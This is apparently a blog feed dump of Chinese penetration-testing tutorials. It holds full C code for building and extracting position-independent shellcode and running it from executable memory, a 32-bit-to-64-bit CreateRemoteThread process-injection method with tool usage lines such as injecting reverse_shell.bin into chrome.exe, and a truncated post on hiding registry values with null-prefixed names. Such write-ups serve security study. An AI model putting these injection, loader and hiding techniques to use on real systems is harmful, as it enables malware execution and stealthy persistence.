MeassageboxA_MyOwn = reinterpret_cast&lt;MESSAGEBOXA_INITIALIZE&gt;(GetProcAddressAPI(LoadLibraryWAPI(struser32), MeassageboxA_api)); MeassageboxA_MyOwn(NULL, NULL, NULL, 0); 需要全部换成typedef的函数声明方式 3、函数调用顺序如果使用以下方式加载shellcode： (*(int(*)()) sc)(); 起始函数的定义应该位于这段shellcode的最前面（和函数声明的顺序无关） 注： shellcode如果包含子函数，应该保证各个函数放在一段连续的地址中，并且起始函数置于最前面，这样在提取机器码后，可以直接加载起始函数执行shellcode 综上，给出新的完整代码： #include &lt;windows.h&gt; #include &lt;Winternl.h&gt; #pragma optimize( &quot;&quot;, off ) void shell_code(); HANDLE GetKernel32Handle(); BOOL __ISUPPER__(__in CHAR c); CHAR __TOLOWER__(__in CHAR c); UINT __STRLEN__(__in LPSTR lpStr1); UINT __STRLENW__(__in LPWSTR lpStr1); LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2); INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2); INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen); LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount); typedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR); typedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR); typedef ULONG (WINAPI *MESSAGEBOXAPI)(HWND, LPWSTR, LPWSTR, ULONG); void shell_code() { LoadLibraryWAPI loadlibrarywapi = 0; GetProcAddressAPI getprocaddressapi=0; MESSAGEBOXAPI messageboxapi=0; wchar_t struser32[] = { L&#39;u&#39;, L&#39;s&#39;, L&#39;e&#39;, L&#39;r&#39;, L&#39;3&#39;,L&#39;2&#39;, L&#39;.&#39;, L&#39;d&#39;, L&#39;l&#39;, L&#39;l&#39;, 0 }; char MeassageboxA_api[] = { &#39;M&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, &#39;a&#39;, &#39;g&#39;, &#39;e&#39;, &#39;B&#39;, &#39;o&#39;, &#39;x&#39;, &#39;A&#39;, 0 }; HANDLE hKernel32 = GetKernel32Handle(); if (hKernel32 == INVALID_HANDLE_VALUE) { return; } LPBYTE lpBaseAddr = (LPBYTE)hKernel32; PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr-&gt;e_lfanew); PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNames); LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfFunctions); LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNameOrdinals); CHAR strLoadLibraryA[] = { &#39;L&#39;, &#39;o&#39;, &#39;a&#39;, &#39;d&#39;, &#39;L&#39;, &#39;i&#39;, &#39;b&#39;, &#39;r&#39;, &#39;a&#39;, &#39;r&#39;, &#39;y&#39;, &#39;W&#39;, 0x0 }; CHAR strGetProcAddress[] = { &#39;G&#39;, &#39;e&#39;, &#39;t&#39;, &#39;P&#39;, &#39;r&#39;, &#39;o&#39;, &#39;c&#39;, &#39;A&#39;, &#39;d&#39;, &#39;d&#39;, &#39;r&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, 0x0 }; for (UINT i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) { LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]); if (!__STRCMPI__(pFuncName, strGetProcAddress)) { getprocaddressapi=(GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]); } else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) { loadlibrarywapi=(LoadLibraryWAPI) (lpBaseAddr + pAddrArray[pOrdArray[i]]); } if (getprocaddressapi != nullptr &amp;&amp; loadlibrarywapi != nullptr) { messageboxapi=(MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api); messageboxapi(NULL, NULL, NULL, 0); return; } } } inline BOOL __ISUPPER__(__in CHAR c) { return (&#39;A&#39; &lt;= c) &amp;&amp; (c &lt;= &#39;Z&#39;); }; inline CHAR __TOLOWER__(__in CHAR c) { return __ISUPPER__(c) ? c - &#39;A&#39; + &#39;a&#39; : c; }; UINT __STRLEN__(__in LPSTR lpStr1) { UINT i = 0; while (lpStr1[i] != 0x0) i++; return i; } UINT __STRLENW__(__in LPWSTR lpStr1) { UINT i = 0; while (lpStr1[i] != L&#39;\0&#39;) i++; return i; } LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2) { CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]); if (!c) return lpStr1; UINT dwLen = __STRLENW__(lpStr2); do { CHAR sc; do { sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]); if (!sc) return NULL; } while (sc != c); } while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0); return (lpStr1 - 1); // FIXME -2 ? } INT __STRCMPI__( __in LPSTR lpStr1, __in LPSTR lpStr2) { int v; CHAR c1, c2; do { c1 = *lpStr1++; c2 = *lpStr2++; // The casts are necessary when pStr1 is shorter &amp; char is signed v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2); } while ((v == 0) &amp;&amp; (c1 != &#39;\0&#39;) &amp;&amp; (c2 != &#39;\0&#39;)); return v; } INT __STRNCMPIW__( __in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen) { int v; CHAR c1, c2; do { dwLen--; c1 = ((PCHAR)lpStr1++)[0]; c2 = ((PCHAR)lpStr2++)[0]; /* The casts are necessary when pStr1 is shorter &amp; char is signed */ v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2); } while ((v == 0) &amp;&amp; (c1 != 0x0) &amp;&amp; (c2 != 0x0) &amp;&amp; dwLen &gt; 0); return v; } LPSTR __STRCAT__( __in LPSTR strDest, __in LPSTR strSource) { LPSTR d = strDest; LPSTR s = strSource; while (*d) d++; do { *d++ = *s++; } while (*s); *d = 0x0; return strDest; } LPVOID __MEMCPY__( __in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount) { LPBYTE s = (LPBYTE)lpSrc; LPBYTE d = (LPBYTE)lpDst; while (dwCount--) *d++ = *s++; return lpDst; } HANDLE GetKernel32Handle() { HANDLE hKernel32 = INVALID_HANDLE_VALUE; #ifdef _WIN64 PPEB lpPeb = (PPEB)__readgsqword(0x60); #else PPEB lpPeb = (PPEB)__readfsdword(0x30); #endif PLIST_ENTRY pListHead = &amp;lpPeb-&gt;Ldr-&gt;InMemoryOrderModuleList; PLIST_ENTRY pListEntry = pListHead-&gt;Flink; WCHAR strDllName[MAX_PATH]; WCHAR strKernel32[] = { &#39;k&#39;, &#39;e&#39;, &#39;r&#39;, &#39;n&#39;, &#39;e&#39;, &#39;l&#39;, &#39;3&#39;, &#39;2&#39;, &#39;.&#39;, &#39;d&#39;, &#39;l&#39;, &#39;l&#39;, L&#39;\0&#39; }; while (pListEntry != pListHead) { PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); if (pModEntry-&gt;FullDllName.Length) { DWORD dwLen = pModEntry-&gt;FullDllName.Length; __MEMCPY__(strDllName, pModEntry-&gt;FullDllName.Buffer, dwLen); strDllName[dwLen / sizeof(WCHAR)] = L&#39;\0&#39;; if (__STRSTRIW__(strDllName, strKernel32)) { hKernel32 = pModEntry-&gt;DllBase; break; } } pListEntry = pListEntry-&gt;Flink; } return hKernel32; } int main() { printf(&quot;1&quot;); shell_code(); printf(&quot;2&quot;); return 0; } 0x03 Shellcode提取 将以上代码编译成exe后使用IDA打开，查看Function Window，找到各子函数起始地址 如图 可以看到各个函数保存在一段连续的地址，并且shellcode起始函数位于最开始 双击第一个函数shell_code(void)，进入IDA文本视图，可查看shell_code(void)函数具体在exe文件中的位置为00000400 如图 查看main函数在exe文件中的位置为00000A00 如图 结合c代码的结构，推断出在exe文件中的偏移范围00000400-00000A00即为我们需要的机器码 使用十六进制编辑器将其中的机器码提取并保存到文件中，文件中的内容即我们需要的shellcode 当然，以上手动提取机器码并保存到文件的功能可通过程序自动实现，完整代码如下： #include &lt;stdafx.h&gt; #include &lt;windows.h&gt; #include &lt;Winternl.h&gt; #pragma optimize( &quot;&quot;, off ) void shell_code(); HANDLE GetKernel32Handle(); BOOL __ISUPPER__(__in CHAR c); CHAR __TOLOWER__(__in CHAR c); UINT __STRLEN__(__in LPSTR lpStr1); UINT __STRLENW__(__in LPWSTR lpStr1); LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2); INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2); INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen); LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount); typedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR); typedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR); typedef ULONG (WINAPI *MESSAGEBOXAPI)(HWND, LPWSTR, LPWSTR, ULONG); void shell_code() { LoadLibraryWAPI loadlibrarywapi = 0; GetProcAddressAPI getprocaddressapi=0; MESSAGEBOXAPI messageboxapi=0; wchar_t struser32[] = { L&#39;u&#39;, L&#39;s&#39;, L&#39;e&#39;, L&#39;r&#39;, L&#39;3&#39;,L&#39;2&#39;, L&#39;.&#39;, L&#39;d&#39;, L&#39;l&#39;, L&#39;l&#39;, 0 }; char MeassageboxA_api[] = { &#39;M&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, &#39;a&#39;, &#39;g&#39;, &#39;e&#39;, &#39;B&#39;, &#39;o&#39;, &#39;x&#39;, &#39;A&#39;, 0 }; HANDLE hKernel32 = GetKernel32Handle(); if (hKernel32 == INVALID_HANDLE_VALUE) { return; } LPBYTE lpBaseAddr = (LPBYTE)hKernel32; PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr-&gt;e_lfanew); PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNames); LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfFunctions); LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNameOrdinals); CHAR strLoadLibraryA[] = { &#39;L&#39;, &#39;o&#39;, &#39;a&#39;, &#39;d&#39;, &#39;L&#39;, &#39;i&#39;, &#39;b&#39;, &#39;r&#39;, &#39;a&#39;, &#39;r&#39;, &#39;y&#39;, &#39;W&#39;, 0x0 }; CHAR strGetProcAddress[] = { &#39;G&#39;, &#39;e&#39;, &#39;t&#39;, &#39;P&#39;, &#39;r&#39;, &#39;o&#39;, &#39;c&#39;, &#39;A&#39;, &#39;d&#39;, &#39;d&#39;, &#39;r&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, 0x0 }; for (UINT i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) { LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]); if (!__STRCMPI__(pFuncName, strGetProcAddress)) { getprocaddressapi=(GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]); } else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) { loadlibrarywapi=(LoadLibraryWAPI) (lpBaseAddr + pAddrArray[pOrdArray[i]]); } if (getprocaddressapi != nullptr &amp;&amp; loadlibrarywapi != nullptr) { messageboxapi=(MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api); messageboxapi(NULL, NULL, NULL, 0); return; } } } inline BOOL __ISUPPER__(__in CHAR c) { return (&#39;A&#39; &lt;= c) &amp;&amp; (c &lt;= &#39;Z&#39;); }; inline CHAR __TOLOWER__(__in CHAR c) { return __ISUPPER__(c) ? c - &#39;A&#39; + &#39;a&#39; : c; }; UINT __STRLEN__(__in LPSTR lpStr1) { UINT i = 0; while (lpStr1[i] != 0x0) i++; return i; } UINT __STRLENW__(__in LPWSTR lpStr1) { UINT i = 0; while (lpStr1[i] != L&#39;\0&#39;) i++; return i; } LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2) { CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]); if (!c) return lpStr1; UINT dwLen = __STRLENW__(lpStr2); do { CHAR sc; do { sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]); if (!sc) return NULL; } while (sc != c); } while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0); return (lpStr1 - 1); // FIXME -2 ? } INT __STRCMPI__( __in LPSTR lpStr1, __in LPSTR lpStr2) { int v; CHAR c1, c2; do { c1 = *lpStr1++; c2 = *lpStr2++; // The casts are necessary when pStr1 is shorter &amp; char is signed v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2); } while ((v == 0) &amp;&amp; (c1 != &#39;\0&#39;) &amp;&amp; (c2 != &#39;\0&#39;)); return v; } INT __STRNCMPIW__( __in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen) { int v; CHAR c1, c2; do { dwLen--; c1 = ((PCHAR)lpStr1++)[0]; c2 = ((PCHAR)lpStr2++)[0]; /* The casts are necessary when pStr1 is shorter &amp; char is signed */ v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2); } while ((v == 0) &amp;&amp; (c1 != 0x0) &amp;&amp; (c2 != 0x0) &amp;&amp; dwLen &gt; 0); return v; } LPSTR __STRCAT__( __in LPSTR strDest, __in LPSTR strSource) { LPSTR d = strDest; LPSTR s = strSource; while (*d) d++; do { *d++ = *s++; } while (*s); *d = 0x0; return strDest; } LPVOID __MEMCPY__( __in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount) { LPBYTE s = (LPBYTE)lpSrc; LPBYTE d = (LPBYTE)lpDst; while (dwCount--) *d++ = *s++; return lpDst; } HANDLE GetKernel32Handle() { HANDLE hKernel32 = INVALID_HANDLE_VALUE; #ifdef _WIN64 PPEB lpPeb = (PPEB)__readgsqword(0x60); #else PPEB lpPeb = (PPEB)__readfsdword(0x30); #endif PLIST_ENTRY pListHead = &amp;lpPeb-&gt;Ldr-&gt;InMemoryOrderModuleList; PLIST_ENTRY pListEntry = pListHead-&gt;Flink; WCHAR strDllName[MAX_PATH]; WCHAR strKernel32[] = { &#39;k&#39;, &#39;e&#39;, &#39;r&#39;, &#39;n&#39;, &#39;e&#39;, &#39;l&#39;, &#39;3&#39;, &#39;2&#39;, &#39;.&#39;, &#39;d&#39;, &#39;l&#39;, &#39;l&#39;, L&#39;\0&#39; }; while (pListEntry != pListHead) { PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); if (pModEntry-&gt;FullDllName.Length) { DWORD dwLen = pModEntry-&gt;FullDllName.Length; __MEMCPY__(strDllName, pModEntry-&gt;FullDllName.Buffer, dwLen); strDllName[dwLen / sizeof(WCHAR)] = L&#39;\0&#39;; if (__STRSTRIW__(strDllName, strKernel32)) { hKernel32 = pModEntry-&gt;DllBase; break; } } pListEntry = pListEntry-&gt;Flink; } return hKernel32; } void __declspec(naked) END_SHELLCODE(void) {} int main() { shell_code(); FILE *output_file; fopen_s(&amp;output_file,&quot;shellcode.bin&quot;, &quot;wb&quot;); fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file); fclose(output_file); return 0; } 注： 打开文件需要以”wb”模式打开二进制文件如果以”w”模式，写入文件的过程中，0A字符会被替换为0D0A,导致shellcode出现问题 0x04 Shellcode测试 使用以下代码可读取文件中保存的shellcode，加载并测试其功能： #include &lt;windows.h&gt; size_t GetSize(char * szFilePath) { size_t size; FILE* f = fopen(szFilePath, &quot;rb&quot;); fseek(f, 0, SEEK_END); size = ftell(f); rewind(f); fclose(f); return size; } unsigned char* ReadBinaryFile(char *szFilePath, size_t *size) { unsigned char *p = NULL; FILE* f = NULL; size_t res = 0; *size = GetSize(szFilePath); if (*size == 0) return NULL; f = fopen(szFilePath, &quot;rb&quot;); if (f == NULL) { printf(&quot;Binary file does not exists!\n&quot;); return 0; } p = new unsigned char[*size]; rewind(f); res = fread(p, sizeof(unsigned char), *size, f); fclose(f); if (res == 0) { delete[] p; return NULL; } return p; } int main(int argc, char* argv[]) { char *szFilePath=&quot;c:\\test\\shellcode.bin&quot;; unsigned char *BinData = NULL; size_t size = 0; BinData = ReadBinaryFile(szFilePath, &amp;size); void *sc = VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (sc == NULL) return 0; memcpy(sc, BinData, size); (*(int(*)()) sc)(); return 0; } LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[32位程序对64位进程的远程注入实现]]></title>
    <url>%2Fposts%2F5f3a19ec.html</url>
    <content type="text"><![CDATA[0x00 前言 要对指定进程进行远程注入，通常使用Windows提供的API CreateRemoteThread创建一个远程线程，进而注入dll或是执行shellcode。 在64位系统下，该方法需要特别注意，注入的目标进程要同程序的结构保持一致，即32位程序只能对32进程作注入，64位程序只能对64位进程作注入 32位程序对64位程序进行注入时会失败(32位和64位的结构不同) 然而，在某些特殊的环境下，无法提前预知目标进程的结构，准备两个不同版本的程序又不现实 所以只能重新思考这个问题： 32位程序真的无法对64位程序进行远程注入吗？ 0x01 简介 我在odzhan的博客里找到了解决思路，文章地址如下： https://modexp.wordpress.com/2015/11/19/dllpic-injection-on-windows-from-wow64-process/ 本文将会介绍实现思路，参考odzhan的开源工程”pi”，编写测试代码，生成32位程序，实现对64位进程calc.exe的进程注入，验证32位程序能够对64进程作注入的结论 0x02 实现思路 1、32位程序支持对64位程序的读写参考资料： rgb/29a： http://www.vxheaven.org/lib/vrg02.html ReWolf： http://blog.rewolf.pl/blog/ https://github.com/rwfpl/rewolf-wow64ext 2、 利用CreateRemoteThread作进程注入的通用方法进程注入流程： OpenProcess VirtualAllocEx WriteProcessMemory VirtualProtectEx CreateRemoteThread WaitForSingleObject 在具体的实现过程中，如果指定了进程名称，需要先将进程名称转换为进程ID，参考代码如下： DWORD processNameToId(LPCTSTR lpszProcessName) { HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) { MessageBox(NULL,&quot;The frist entry of the process list has not been copyied to the buffer&quot;,&quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; } while (Process32Next(hSnapshot, &amp;pe)) { if (!strcmp(lpszProcessName, pe.szExeFile)) { return pe.th32ProcessID; } } return 0; } 依次实现如下操作： 根据进程ID打开进程，获得进程句柄 申请内存空间 写入数据 将内存改为可读可执行(可选) 创建线程 等待线程退出(可选) 代码可参考： http://blog.csdn.net/g710710/article/details/7303081 对参考代码作细微修改，将注入进程名称指定为calc.exe，完整代码已上传github，地址如下： https://github.com/3gstudent/CreateRemoteThread/blob/master/CreateRemoteThreadTest.cpp 程序运行后，查找进程calc.exe，接着尝试远程注入，弹出对话框，如图 将程序编译成x86，对32位的进程calc.exe进行注入，成功 将程序编译成x64，对64位的进程calc.exe进行注入，成功 将程序编译成x86，对64位的进程calc.exe进行注入，OpenProcess、VirtualAllocEx、WriteProcessMemory、VirtualProtectEx均正常，执行CreateRemoteThread时会报错 解决思路： 参考rgb/29a和ReWolf的思路，将此处的CreateRemoteThread切换为64位后再创建线程，完成后再切换回32位，即可实现32位程序对64位进程的远程注入 3、判断当前系统是32位还是64位使用API： void WINAPI GetNativeSystemInfo( _Out_ LPSYSTEM_INFO lpSystemInfo ); 查看结构体中的wProcessorArchitecture可获得CPU架构，进而判断操作系统 代码如下： #include &lt;windows.h&gt; BOOL Is64BitOS() { typedef VOID (WINAPI *LPFN_GetNativeSystemInfo)( __out LPSYSTEM_INFO lpSystemInfo ); LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;),&quot;GetNativeSystemInfo&quot;); if(fnGetNativeSystemInfo) { SYSTEM_INFO stInfo = {0}; fnGetNativeSystemInfo( &amp;stInfo); if( stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) { return TRUE; } } return FALSE; } int main() { if (Is64BitOS()) printf(&quot;x64\n&quot;); else printf(&quot;x86\n&quot;); return 0; } 4、判断注入的进程是32位还是64位查找进程ID，打开进程，获得句柄，使用API，传入参数，进行判断 使用API： BOOL WINAPI IsWow64Process( __in HANDLE hProcess, __out PBOOL Wow64Process ); 返回true, 代表进程是32位，否则是64位 完整代码如下： #include &lt;windows.h&gt; #include &lt;TlHelp32.h&gt; BOOL IsWow64(HANDLE hProcess) { typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); LPFN_ISWOW64PROCESS fnIsWow64Process; BOOL bIsWow64 = FALSE; fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;),&quot;IsWow64Process&quot;); if (NULL != fnIsWow64Process) { fnIsWow64Process(hProcess, &amp;bIsWow64); } return bIsWow64; } DWORD processNameToId(LPCTSTR lpszProcessName) { HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) { MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;,&quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; } while (Process32Next(hSnapshot, &amp;pe)) { if (!strcmp(lpszProcessName, pe.szExeFile)) { return pe.th32ProcessID; } } return 0; } int main() { BOOL bWow64; char *szExeName=&quot;calc.exe&quot;; DWORD dwProcessId = processNameToId(szExeName); if (dwProcessId == 0) { MessageBox(NULL, &quot;The target process have not been found !&quot;,&quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1; } HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hTargetProcess) { MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; } bWow64 = IsWow64(hTargetProcess); if(bWow64) printf(&quot;32-bit process\n&quot;); else printf(&quot;64-bit process\n&quot;); } 5、开源工程pi下载地址： https://github.com/odzhan/shellcode/tree/master/win/pi usage: pi [options] &lt;proc name | proc id&gt; -d Wait after memory allocation before running thread -e &lt;cmd&gt; Execute command in context of remote process (shows window) -f &lt;file&gt; Load a PIC file into remote process -l &lt;dll&gt; Load a DLL file into remote process -p List available processes on system -x &lt;cpu&gt; Exclude process running in cpu mode, 32 or 64 examples: pi -e &quot;cmd /c echo this is a test &gt; test.txt &amp; notepad test.txt&quot; -x32 iexplore.exe pi -l ws2_32.dll notepad.exe pi -f reverse_shell.bin chrome.exe 测试系统： Win7x64 cmd执行： pi32.exe -e &quot;cmd /c start calc.exe&quot; -x32 calc.exe 上述命令将对64位的calc.exe进行注入 回显如图 payload没有成功执行 0x03 最终代码 虽然pi测试失败，但是代码值得参考，提取关键代码，开发测试程序 测试程序结构如下： 判断当前系统 如果为32位系统， 调用系统api CreateRemoteThread，对目标进程尝试远程注入，弹出对话框 如果为64位系统，进入下一个分支，对进程判断 判断进程calc.exe 如果为32位，调用系统api CreateRemoteThread，对目标进程尝试远程注入，弹出对话框 如果为64位，调用自定义api CreateRemoteThread64，对目标进程尝试远程注入，执行payload：”cmd /c start calc.exe” 完整代码已上传github，下载地址如下： https://github.com/3gstudent/CreateRemoteThread/blob/master/CreateRemoteThread32to64.cpp 0x04 实际测试 测试系统： Win7 x64 1、将程序编译成32位，打开64位calc.exe 2、运行测试程序 命令行输出如图 成功执行payload：”cmd /c start calc.exe”，弹出计算器 0x05 小结 本文介绍了32位程序对64位进程远程注入的实现方法，参照以上代码可实现Windows 32位/64位系统下进程注入的通用模板。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——"隐藏"注册表的更多测试]]></title>
    <url>%2Fposts%2Ffbd43bf8.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《渗透技巧——“隐藏”注册表的创建》介绍了Poweliks使用过的注册表隐藏技术，分析原理，编写c程序实现功能 本文将做进一步测试，分享一种更为”隐蔽”的方法（该方法暂未找到公开资料，待定） 0x01 简介 本文将要介绍以下内容： 使用Win32 API读取时的错误 “\0”放在字符串中间的情况 其他Native API(如NtCreateFile)的应用 更加隐蔽的利用方法 防御检测 0x02 隐藏原理 对于Windows系统，”\0”(即0x0000)会被识别为字符串的结束符 所以在对该字符串读取的过程中，遇到开头的”\0”，会被解析成结束符，提前截断，导致读取错误 而使用Native API设定注册表，需要使用结构体OBJECT_ATTRIBUTES作为参数， 指定读取的字符串长度 只要长度设定正常，就能够读取正确的字符串，避免这个bug 利用的关键： 使用Native API多了一个参数，能够指定读取字符串的长度 那么，对该问题展开进一步思考，就有了如下测试 0x03 使用Win32 API读取时，具体是什么样的错误？ 使用HiddenNtRegistry创建测试注册表键值，c++调用代码如下： printf(&quot;=================Normal Key=================\n&quot;); printf(&quot;1.CreateKey:\n&quot;); MyCreateKey(&quot;\\Registry\\Machine\\Software\\test1&quot;); printf(&quot;2.OpenKey:\n&quot;); hKey = MyOpenKey(&quot;\\Registry\\Machine\\Software\\test1&quot;); printf(&quot;3.SetValueKey:\n&quot;); MySetValueKey(hKey,&quot;test1&quot;,&quot;0123456789abcdef&quot;,REG_SZ); printf(&quot;=================Hidden Key=================\n&quot;); printf(&quot;1.OpenKey:\n&quot;); hKey = MyOpenKey(&quot;\\Registry\\Machine\\Software\\test1&quot;); printf(&quot;2.SetHiddenValueKey:\n&quot;); MySetHiddenValueKey(hKey,&quot;\0test1&quot;,&quot;hidden0123456789abcdef&quot;,REG_SZ); printf(&quot;3.QueryHiddenValueKey:\n&quot;); MyQueryHiddenValueKeyString(hKey,&quot;\0test1&quot;); 程序实现以下功能： 创建注册表键值test1，内容为0123456789abcdef 创建注册表键值\0test1，内容为hidden0123456789abcdef 运行如下图 使用Win32 API RegQueryValueEx尝试读取以上两个注册表键值 关键代码如下： LONG lReturnCode = 0; HKEY hkey; LPCTSTR RegPath = _T(&quot;Software\\test1&quot;); if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, RegPath, 0, KEY_READ, &amp;hkey)) { char dwValue[1024]; DWORD dwSzType = REG_SZ; DWORD dwSize = sizeof(dwValue); lReturnCode = ::RegQueryValueEx(hkey, _T(&quot;test1&quot;), 0, &amp;dwSzType, (LPBYTE)&amp;dwValue, &amp;dwSize); if(lReturnCode != ERROR_SUCCESS) { printf(&quot;lReturnCode:%d\n&quot;,lReturnCode); if(lReturnCode = 2) printf(&quot;ERROR_FILE_NOT_FOUND\n&quot;); return 0; } printf(&quot;RegQueryValue:&quot;); for (int i=0;i&lt;dwSize/2-1;i++) { printf(&quot;%c&quot;,dwValue[i*2]); } } ::RegCloseKey(hkey); 读取注册表键值test1，成功获取内容 读取注册表键值\0test1,修改代码如下： lReturnCode = ::RegQueryValueEx(hkey, _T(&quot;\0test1&quot;), 0, &amp;dwSzType, (LPBYTE)&amp;dwValue, &amp;dwSize); 读取失败，返回ERROR_FILE_NOT_FOUND 验证上文原理： 由于”\0”的作用，字符串提前被截断，识别为空字符，导致无法获得名称 接着做进一步尝试 0x04 “\0”放在字符串中间会怎样？ HiddenNtRegistry的代码为： printf(&quot;1.OpenKey:\n&quot;); hKey = MyOpenKey(&quot;\\Registry\\Machine\\Software\\test2&quot;); printf(&quot;2.SetHiddenValueKey:\n&quot;); MySetHiddenValueKey2(hKey,&quot;test2\0abc&quot;,&quot;hidden0123456789abcdef&quot;,REG_SZ); printf(&quot;3.QueryHiddenValueKey:\n&quot;); MyQueryHiddenValueKeyString2(hKey,&quot;test2\0abc&quot;); 注： 原工程HiddenNtRegistry中的MySetHiddenValueKey函数和MyQueryHiddenValueKeyString函数需要作适当修改，重新计算字符串长度，新的函数命名为MySetHiddenValueKey2和MyQueryHiddenValueKeyString2 程序实现以下功能： 创建注册表键值test2\0abc，内容为hidden0123456789abcdef 读取注册表键值test2\0abc的内容 运行如下图 使用regedit.exe查询该键值，弹框提示无法获取，如下图 这里可以做一个大胆的尝试： 既然test2\0abc中的”\0”会截断字符串，那么我们再创建一个名为test2的键值会怎么样呢？ 创建注册表键值test2,内容为0123456789abcdef,关键代码如下： hKey = MyOpenKey(&quot;\\Registry\\Machine\\Software\\test2&quot;); 